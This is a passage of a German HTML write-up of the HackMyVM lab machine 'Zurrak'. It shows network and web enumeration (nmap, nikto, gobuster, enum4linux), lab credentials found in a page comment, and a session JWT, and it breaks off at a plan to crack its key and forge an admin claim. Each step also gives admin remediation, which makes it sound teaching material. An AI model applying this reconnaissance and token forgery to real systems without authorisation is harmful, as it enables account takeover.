@@ -1,0 +1,1283 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zurrak - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header-Hintergrundfarbe wird durch CSS gesteuert -->
+    <div class="header-bg">
+        <h1>Zurrak - HackMyVM - Medium - Bericht</h1> <!-- Titel angepasst -->
+        <!-- Schwierigkeitsgrad-Container mit Klasse für CSS-Styling -->
+        <div class="level-container level-easy"> <!-- Klasse easy für korrekte Farbe via CSS -->
+            <!-- Kein Inline-Style mehr -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Kein Inline-Style mehr -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools werden hier eingefügt -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">enum4linux</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">steghide</div>
+                <!-- hashcat wurde erwähnt, aber nicht ausgeführt -->
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">smbclient</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">python3</div>
+                <!-- Weitere implizite Tools: curl/Browser (view-source), bash -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis wird hier eingefügt -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#poc">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <!-- Reconnaissance Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 08:00:27:1c:9c:04, IPv4: 192.168.2.199
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+<span class="command">192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD</span>
+<span class="command">192.168.2.101	ac:6f:bb:62:87:79	TATUNG Technology Inc.</span>
+<span class="command">192.168.2.103	80:47:86:96:f6:3a	Samsung Electronics Co.,Ltd</span>
+<span class="command">192.168.2.106	08:00:27:7e:2b:4a	PCS Systemtechnik GmbH</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um das lokale Netzwerk (Layer 2) nach aktiven Hosts zu durchsuchen. Er sendet ARP-Requests an alle möglichen IP-Adressen im Subnetz (hier implizit /24 basierend auf der Interface-IP 192.168.2.199) und listet die antwortenden Geräte mit ihren IP- und MAC-Adressen sowie dem Hersteller (basierend auf der MAC) auf. Das `-l` steht für `--localnet`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein grundlegender erster Schritt zur Host-Discovery im lokalen Netz. Er ist schnell und oft effektiver als ein Ping-Scan, da er nicht auf ICMP angewiesen ist, welches durch Firewalls blockiert sein kann. Wir identifizieren mehrere Geräte, darunter unser potenzielles Ziel mit der IP `192.168.2.106`, dessen MAC-Adresse auf eine VirtualBox-VM hindeutet (`08:00:27:...`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die IP-Adresse `192.168.2.106` als primäres Ziel für weitere Scans (z.B. Nmap Portscan). Die anderen IPs können ignoriert werden, wenn sie nicht zum Scope des Tests gehören.
+<br><strong>Empfehlung (Admin):</strong> ARP-Scans sind schwer zu unterbinden, aber Netzwerksegmentierung und Intrusion Detection Systeme (IDS) können helfen, unautorisierte Scans zu erkennen und darauf zu reagieren. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+127.0.0.1	localhost
+127.0.1.1	cyber
+
+
+        #       192.168.2.104   darkside.hmv
+        #       192.168.2.105   king.vln
+                <span class="command">192.168.2.106   zurrak.hmv</span>
+        #       192.168.2.107   za.hmv za1.hmv
+        #       192.168.2.108   library.vln
+        #       192.168.2.109	lampiano.vln
+        #       192.168.2.110   infosecwarrior.vln
+        #       192.168.2.111   usv.vln
+        #       192.168.2.112   easy.vln skymbu.info
+        #       192.168.2.113   myserver.vln
+        #       192.168.2.114   oscp.vln
+        #       192.168.2.115   gemini.vln
+        #       192.168.2.116	dobby.vln
+        #       192.168.2.117   dina.vln
+        #       192.168.2.118   maschi.vln masashi
+        #       192.168.2.119   momentum.vln
+        #       192.168.2.120   printer4life.printer.hmv printer.hmv
+        #       192.168.2.121   factor.hmv
+        #       192.168.2.122   democracy.hmv
+        #       192.168.2.123   principle.hmv hellfire.T4L0S.hmv
+        #       192.168.2.124	ricky.vln
+        #       192.168.2.125	skytower.vln
+        #       192.168.2.126   funbox.vln
+        #       192.168.2.127   toppo.vln
+        #       192.168.2.128   funbox5.vln
+        #       192.168.2.129   funbox6.vln funbox6.box
+        #       192.168.2.130	kb-vuln.vln kb.vuln
+        #       192.168.2.131   mygirl.vln
+        #       192.168.2.132   deeper.hmv
+        #       192.168.2.134	observer.hmv
+        #       192.168.2.135   inkplot.hmv
+        #       192.168.2.136   democracy.hmv
+        #       192.168.2.138   codeshield.hmv
+                192.168.2.139   birthday.hmv
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `vi /etc/hosts` bearbeite ich die lokale Hosts-Datei meines Angreifer-Systems. Diese Datei dient dazu, Hostnamen manuell IP-Adressen zuzuordnen, ohne einen DNS-Server abfragen zu müssen. Ich füge den Eintrag `192.168.2.106 zurrak.hmv` hinzu (oder aktiviere ihn, falls er schon auskommentiert vorhanden war).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein wichtiger vorbereitender Schritt. Viele Webanwendungen und Dienste sind so konfiguriert, dass sie nur korrekt funktionieren oder bestimmte Inhalte nur anzeigen, wenn sie über ihren vorgesehenen Hostnamen angesprochen werden (Virtual Hosting). Indem ich diesen Eintrag hinzufüge, kann ich das Zielsystem nun über `zurrak.hmv` anstelle der IP-Adresse ansprechen, was für spätere Web-Enumeration und Exploitation entscheidend sein kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Immer die Hosts-Datei pflegen, wenn Hostnamen bekannt werden oder vermutet werden (z.B. aus Zertifikaten, Webseiteninhalten, Fehlermeldungen). Dies stellt sicher, dass Tools wie Browser, Gobuster, Nikto etc. das Ziel korrekt ansprechen.
+<br><strong>Empfehlung (Admin):</strong> Dieses Vorgehen auf der Client-Seite ist nicht direkt zu verhindern. Serverseitig sollte man sich bewusst sein, dass Angreifer versuchen könnten, Virtual Hosts zu erraten oder zu finden. Eine klare Dokumentation der verwendeten Hostnamen ist hilfreich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.106 -p-</span></div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-22 23:01 CET
+Nmap scan report for zurrak.hmv (192.168.2.106)
+Host is up (0.00023s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+<span class="command">80/tcp   open  http        Apache httpd 2.4.57 ((Debian))</span>
+|_http-server-header: Apache/2.4.57 (Debian)
+| http-title: Login Page
+|_Requested resource was login.php
+<span class="command">139/tcp  open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp  open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">5432/tcp open  postgresql  PostgreSQL DB 9.6.0 or later</span>
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=zurrak
+| Subject Alternative Name: DNS:zurrak
+| Not valid before: 2023-10-20T19:29:16
+|_Not valid after:  2033-10-17T19:29:16
+| fingerprint-strings:
+|   SMBProgNeg:
+|     SFATAL
+|     VFATAL
+|     C0A000
+|     Munsupported frontend protocol 65363.19778: server supports 3.0 to 3.0
+|     Fpostmaster.c
+|     L2195
+|_    RProcessStartupPacket
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port5432-TCP:V=7.94SVN%I=7%D=11/22%Time=655E7A5A%P=x86_64-pc-linux-gnu%
+SF:r(SMBProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20fro
+SF:ntend\x20protocol\x2065363\.19778:\x20server\x20supports\x203\.0\x20to\
+SF:x203\.0\0Fpostmaster\.c\0L2195\0RProcessStartupPacket\0\0");
+MAC Address: 08:00:27:7E:2B:4A (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+
+Host script results:
+|_clock-skew: 1s
+| smb2-time:
+|   date: 2023-11-22T22:02:13
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    <span class="password">Message signing enabled but not required</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.23 ms zurrak.hmv (192.168.2.106)
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen detaillierten Nmap-Scan durch: `-sS` (SYN-Scan, schnell und unauffällig), `-sV` (Versionserkennung), `-A` (Aggressiver Scan: OS-Erkennung, Versionserkennung, Skript-Scan, Traceroute), `-O` (Betriebssystemerkennung, redundant zu -A, aber explizit), `-T5` (Sehr aggressives Timing für Geschwindigkeit), `-p-` (Alle 65535 TCP-Ports). Das Ziel ist `192.168.2.106`, das wir zuvor als `zurrak.hmv` identifiziert haben.
+Die Ausgabe zeigt offene Ports:
+*   **80 (HTTP):** Apache 2.4.57 (Debian) mit einer Weiterleitung auf `login.php`.
+*   **139/445 (NetBIOS/SMB):** Samba smbd 4.6.2. Message Signing ist aktiviert, aber nicht erzwungen.
+*   **5432 (PostgreSQL):** PostgreSQL DB 9.6.0 oder neuer. Nmap hat Schwierigkeiten, den Dienst eindeutig zu identifizieren (Fingerprint wird angezeigt), aber das SSL-Zertifikat bestätigt den Hostnamen "zurrak".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist eine hervorragende Informationsbasis. Wir haben drei Hauptangriffsvektoren: Web (Apache), SMB (Samba) und Datenbank (PostgreSQL). Die spezifischen Versionen (Apache 2.4.57, Samba 4.6.2, PostgreSQL 9.6+) sind wichtig für die Suche nach bekannten Schwachstellen. Die Weiterleitung auf `login.php` deutet auf eine Webanwendung mit Authentifizierung hin. SMB ist oft ein guter Ansatzpunkt für Enumeration oder Angriffe, wenn Shares offen sind oder schwache Passwörter verwendet werden. PostgreSQL erfordert typischerweise gültige Zugangsdaten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+1.  **Web (Port 80):** Untersuche `login.php`. Führe Verzeichnis-/Datei-Bruteforcing durch (Gobuster, Nikto). Suche nach Web-Schwachstellen (SQLi, XSS, LFI/RFI etc.).
+2.  **SMB (Port 139/445):** Versuche, Shares aufzulisten (`smbclient -L`, `enum4linux`). Prüfe auf anonymen Zugriff oder versuche Standard-/erratene Zugangsdaten. Suche nach bekannten Schwachstellen für Samba 4.6.2.
+3.  **PostgreSQL (Port 5432):** Versuche Standard-Zugangsdaten (`postgres:postgres`, `postgres:password` etc.). Suche nach bekannten Schwachstellen für PostgreSQL 9.6+.
+<br><strong>Empfehlung (Admin):</strong>
+1.  **Web:** Halten Sie Apache und die Webanwendung aktuell. Implementieren Sie Sicherheitsheader (X-Frame-Options, X-Content-Type-Options). Schützen Sie die Login-Seite gegen Brute-Force.
+2.  **SMB:** Deaktivieren Sie SMB, wenn nicht benötigt. Wenn benötigt, erzwingen Sie Message Signing (`smb encrypt = required` in `smb.conf`), verwenden Sie starke Passwörter und beschränken Sie den Zugriff auf Shares. Halten Sie Samba aktuell.
+3.  **PostgreSQL:** Stellen Sie sicher, dass der Zugriff auf die Datenbank netzwerkseitig eingeschränkt ist und starke, einzigartige Passwörter verwendet werden. Halten Sie PostgreSQL aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -AO -T5 192.168.2.106 -p- | grep open</span></div>
+                    <pre>
+<span class="command">80/tcp   open  http        Apache httpd 2.4.57 ((Debian))</span>
+<span class="command">139/tcp  open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">445/tcp  open  netbios-ssn Samba smbd 4.6.2</span>
+<span class="command">5432/tcp open  postgresql  PostgreSQL DB 9.6.0 or later</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Befehl wiederholt den vorherigen Nmap-Scan, leitet die Ausgabe jedoch durch `grep open`. Das filtert die Ausgabe und zeigt nur die Zeilen an, die das Wort "open" enthalten, also die identifizierten offenen Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine reine Formatierungs- und Filtermaßnahme, um eine schnelle Übersicht über die offenen Ports zu erhalten. Es liefert keine neuen technischen Informationen im Vergleich zum vorherigen Scan, ist aber nützlich für eine schnelle Zusammenfassung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `grep` oder andere Filterwerkzeuge, um lange Ausgaben zu strukturieren und die relevantesten Informationen schnell zu extrahieren.
+<br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung bezüglich dieses Filterbefehls. Die Empfehlungen aus dem vorherigen Nmap-Scan bleiben gültig.</p>
+            <!-- Reconnaissance Inhalt endet hier -->
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <!-- Web Enumeration Inhalt beginnt hier -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.106</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.106
++ Target Hostname:    192.168.2.106
++ Target Port:        80
++ Start Time:         2023-11-22 23:02:07 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.57 (Debian)
++ /: <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span> See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: <span class="password">The X-Content-Type-Options header is not set.</span> This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ Root page / redirects to: <span class="command">login.php</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /login.php: <span class="password">Admin login page/section found.</span>
++ /composer.json: <span class="command">PHP Composer configuration file reveals configuration information.</span> See: https://getcomposer.org/
++ /composer.lock: <span class="command">PHP Composer configuration file reveals configuration information.</span> See: https://getcomposer.org/
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2023-11-22 23:02:33 (GMT1) (26 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich setze `nikto` ein, einen Webserver-Scanner, um nach bekannten Schwachstellen, Konfigurationsfehlern und interessanten Dateien/Verzeichnissen zu suchen. `-h 192.168.2.106` gibt das Ziel an.
+Nikto findet:
+*   Fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), die auf mögliche Clickjacking- oder MIME-Sniffing-Angriffe hindeuten.
+*   Bestätigt die Weiterleitung von `/` zu `login.php`.
+*   Identifiziert `login.php` als potenzielle Admin-Login-Seite.
+*   Findet `composer.json` und `composer.lock`. Dies sind Dateien, die von PHP Composer (einem Dependency Manager) verwendet werden und Informationen über verwendete Bibliotheken und Versionen preisgeben können.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die fehlenden Header sind typische Findings, aber von geringerem direktem Exploit-Wert. Die `composer.*`-Dateien sind jedoch potenziell sehr wertvoll. Sie könnten auf veraltete oder verwundbare PHP-Bibliotheken hinweisen, die als Angriffsvektor dienen könnten. Die Bestätigung der `login.php` verstärkt den Fokus auf diesen Bereich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade `composer.json` und `composer.lock` herunter und analysiere sie auf verwendete Abhängigkeiten und deren Versionen. Suche nach bekannten Schwachstellen für diese Abhängigkeiten. Untersuche die `login.php` weiter auf Schwachstellen (SQLi, Brute-Force etc.).
+<br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`). Stellen Sie sicher, dass `composer.json` und `composer.lock` nicht öffentlich zugänglich sind (z.B. durch Webserver-Konfiguration oder indem sie außerhalb des Web-Roots liegen). Aktualisieren Sie alle PHP-Abhängigkeiten regelmäßig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://zurrak.hmv" -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"  -b '403,404' -e --no-error -k</span></div>
+                    <pre>
+==============================================================================================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+==============================================================================================================================
+[+] Url:                     http://zurrak.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+[+] Negative Status codes:   403,404
+[+] Expanded:                true
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js
+[+] User Agent:              gobuster/3.6
+[+] Skip TLS verification:   true
+[+] No error logging:        true
+[+] Timeout:                 10s
+===============================================================
+2023/11/22 23:05:31 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://zurrak.hmv/index.php</span>            (Status: 302) [Size: 1270] [-&gt; login.php]
+<span class="command">http://zurrak.hmv/login.php</span>            (Status: 200) [Size: 2041]
+<span class="command">http://zurrak.hmv/admin.php</span>            (Status: 302) [Size: 2625] [-&gt; login.php]
+<span class="command">http://zurrak.hmv/vendor</span>               (Status: 301) [Size: 309]  [-&gt; http://zurrak.hmv/vendor/]
+<span class="command">http://zurrak.hmv/index_.php</span>           (Status: 200) [Size: 200]
+
+===============================================================
+2023/11/22 23:15:12 Finished
+===============================================================
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe einen weiteren `gobuster`-Scan durch, diesmal mit deutlich mehr Optionen:
+*   `-u "http://zurrak.hmv"`: Ziel-URL (korrekt mit Hostnamen).
+*   `-x ...`: Eine sehr lange Liste von Dateierweiterungen, um nach verschiedensten Dateitypen zu suchen.
+*   `-w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"`: Eine größere Wortliste für Verzeichnisse/Dateien.
+*   `-b '403,404'`: Blendet Ergebnisse mit Statuscodes 403 (Forbidden) und 404 (Not Found) aus, um die Ausgabe übersichtlicher zu gestalten.
+*   `-e`: Erweitert die URLs, zeigt den vollen Pfad an.
+*   `--no-error`: Unterdrückt Fehlermeldungen.
+*   `-k`: Überspringt die TLS/SSL-Zertifikatsverifizierung (hier nicht relevant für HTTP).
+Gefunden wurden:
+*   `index.php` (leitet zu `login.php` weiter).
+*   `login.php` (Status 200 OK).
+*   `admin.php` (leitet zu `login.php` weiter, deutet auf einen geschützten Admin-Bereich hin).
+*   `vendor/` (Ein Verzeichnis, das oft von Composer für Abhängigkeiten genutzt wird).
+*   `index_.php` (Eine interessante Datei, möglicherweise eine Test- oder Backup-Version).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan liefert wichtige neue Funde. `admin.php` bestätigt die Existenz eines Admin-Bereichs. Das `vendor/`-Verzeichnis könnte sensible Informationen oder verwundbare Bibliotheken enthalten (im Zusammenhang mit den `composer.*`-Dateien). `index_.php` ist besonders verdächtig und sollte genau untersucht werden, da solche Dateien oft unbeabsichtigt Informationen preisgeben oder alternative Funktionalitäten bieten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+1.  Untersuche `index_.php` genau. Betrachte den Quellcode und teste die Funktionalität.
+2.  Versuche, auf `admin.php` zuzugreifen (vermutlich nach erfolgreichem Login).
+3.  Navigiere zum `vendor/`-Verzeichnis und prüfe, ob Verzeichnislisting aktiviert ist oder ob bekannte Pfade zu Bibliotheken existieren.
+<br><strong>Empfehlung (Admin):</strong> Benennen Sie Backup- oder Testdateien nicht einfach um (z.B. `index_.php`), sondern entfernen Sie sie vom Webserver oder verschieben Sie sie außerhalb des Web-Roots. Beschränken Sie den Zugriff auf das `vendor/`-Verzeichnis über die Webserver-Konfiguration. Stellen Sie sicher, dass Admin-Bereiche robust geschützt sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">enum4linux -a 192.168.2.106</span></div>
+                    <pre>
+
+ ===================================( Session Check on 192.168.2.106 )===================================
+
+
+[E] <span class="password">Server doesn't allow session using username '', password ''.  Aborting remainder of tests.</span>
+
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `enum4linux` ist ein Tool zur Enumeration von Informationen aus Windows- und Samba-Systemen. Die Option `-a` steht für "all" und versucht, eine Vielzahl von Informationen abzurufen (Userlisten, Shares, Gruppen, Passwortrichtlinien etc.). Der Versuch, eine anonyme Sitzung (mit leerem Benutzernamen und Passwort) aufzubauen, scheitert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Scheitern des anonymen Zugriffs ist eine gute Sicherheitsmaßnahme seitens des Ziels. Es verhindert, dass ein Angreifer ohne gültige Zugangsdaten einfach Benutzerlisten oder Share-Informationen abrufen kann. Das bedeutet, dass wir für weitere SMB-Enumeration oder -Zugriffe wahrscheinlich gültige Credentials benötigen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, gültige SMB-Benutzernamen/Passwörter zu finden (z.B. durch Web-Exploitation, Auslesen von Konfigurationsdateien, Brute-Force auf bekannte Benutzer). Fokussiere dich vorerst auf andere Angriffsvektoren (Web, PostgreSQL).
+<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass anonymer Zugriff auf SMB/NetBIOS deaktiviert ist (`restrict anonymous = 2` in `smb.conf` ist eine gute Einstellung). Verwenden Sie starke Passwörter für alle SMB-Benutzer.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">http://zurrak.hmv/index_.php</span>
+<span class="password">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZXhhbXBsZS5vcmciLCJhdWQiOiJodHRwOi8vZXhhbXBsZS5jb20iLCJpYXQiOjEzNTY5OTk1MjQsIm5iZiI6MTM1NzAwMDAwMH0.gOEkQc3YCCIIjE-GxU0UTa9Lx6hQwwk5zYfO4pZQZt4</span>
+
+
+{
+  "iss": "http://example.org",
+  "aud": "http://example.com",
+  "iat": 1356999524,
+  "nbf": 1357000000
+}
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich habe die zuvor entdeckte Datei `index_.php` aufgerufen. Die Ausgabe zeigt einen JSON Web Token (JWT) und dessen dekodierten Payload (Nutzdaten). Ein JWT besteht aus drei Teilen, die durch Punkte getrennt sind: Header (Typ, Algorithmus), Payload (Daten/Claims) und Signatur. Hier sehen wir den Header (`"alg": "HS256"` bedeutet HMAC mit SHA-256) und den Payload mit Beispiel-Claims (`iss`, `aud`, `iat`, `nbf`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein sehr interessanter Fund! Die `index_.php` scheint ein Beispiel oder Test für JWT-Handling zu sein. Obwohl dieser spezifische Token wahrscheinlich nicht direkt nützlich ist (da er Beispiel-Claims und eine unbekannte Signatur hat), zeigt er, dass die Anwendung JWTs verwendet. Der HS256-Algorithmus bedeutet, dass die Signatur mit einem geheimen Schlüssel erstellt wird. Wenn wir diesen Schlüssel finden oder erraten können, könnten wir eigene gültige JWTs erstellen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suche nach dem geheimen Schlüssel, der zur Signierung der JWTs verwendet wird (z.B. in Konfigurationsdateien, Quellcode, durch Brute-Force, wenn der Schlüssel schwach ist). Analysiere, wie die echte Anwendung (`login.php`, `admin.php`) JWTs verwendet (z.B. in Cookies oder Headern nach dem Login).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+view-source:http://zurrak.hmv/login.php
+
+&lt;-- <span class="password">username:internal@zurrak.htb &amp;&amp; password:testsite</span> --&gt;
+
+view-source:http://zurrak.hmv/index.php#
+
+        &lt;-- &lt;a class="navbar-brand" href="<span class="command">admin.php</span>"&gt;Admin Panel&lt;/a&gt;--&gt;
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich untersuche den Quellcode der Seiten `login.php` und `index.php` (wahrscheinlich durch Rechtsklick -> "Seitenquelltext anzeigen" im Browser oder mit `curl`). Im Quellcode von `login.php` finde ich einen auskommentierten HTML-Kommentar, der Zugangsdaten enthält: `username:internal@zurrak.htb` und `password:testsite`. Im Quellcode von `index.php` finde ich ebenfalls einen auskommentierten Link zum `admin.php`-Panel.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein kritischer Fund! Auskommentierte Zugangsdaten im Quellcode sind ein schwerwiegender Fehler. Diese Credentials (`internal@zurrak.htb` / `testsite`) könnten uns den Zugriff auf die Anwendung ermöglichen. Der auskommentierte Admin-Link bestätigt erneut die Existenz des Admin-Panels.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche sofort, dich mit den gefundenen Zugangsdaten (`internal@zurrak.htb` / `testsite`) auf der `login.php` anzumelden. Wenn erfolgreich, versuche auf `admin.php` zuzugreifen.
+<br><strong>Empfehlung (Admin):</strong> Niemals Zugangsdaten, API-Schlüssel oder andere sensible Informationen im Quellcode hinterlassen, auch nicht auskommentiert! Code vor dem Deployment gründlich auf solche Relikte überprüfen. Kommentare sollten nur nicht-sensible Erklärungen enthalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+Cookie
+	token=<span class="password">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJlbWFpbCI6ImludGVybmFsQHp1cnJhay5odGIiLCJpc0FkbWluIjpmYWxzZSwiaWF0IjoxMzU2OTk5NTI0LCJuYmYiOjEzNTcwMDAwMDB9.ufkwBsusc4IEYCCRszCbcSEv6irCtUSx-Uq08OThxso</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem erfolgreichen Login mit den gefundenen Zugangsdaten (`internal@zurrak.htb` / `testsite`) untersuche ich die vom Server gesetzten Cookies (z.B. mit den Entwicklertools des Browsers). Ich finde ein Cookie namens `token`, dessen Wert ein weiterer JWT ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt die Verwendung von JWTs zur Sitzungsverwaltung. Wenn wir diesen JWT dekodieren (z.B. auf jwt.io oder mit einem Tool), sehen wir den Payload. Besonders interessant ist der Claim `"isAdmin": false`. Das deutet darauf hin, dass dieser Claim steuert, ob der Benutzer Admin-Rechte hat.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, den geheimen Schlüssel zu knacken, der zum Signieren dieses JWTs verwendet wird (siehe vorherige Empfehlung zu `index_.php`). Wenn der Schlüssel bekannt ist, ändere den Claim `"isAdmin": false` zu `"isAdmin": true`, signiere den Token neu mit dem Schlüssel und ersetze das Cookie im Browser durch den modifizierten Token. Versuche dann, auf `admin.php` zuzugreifen.
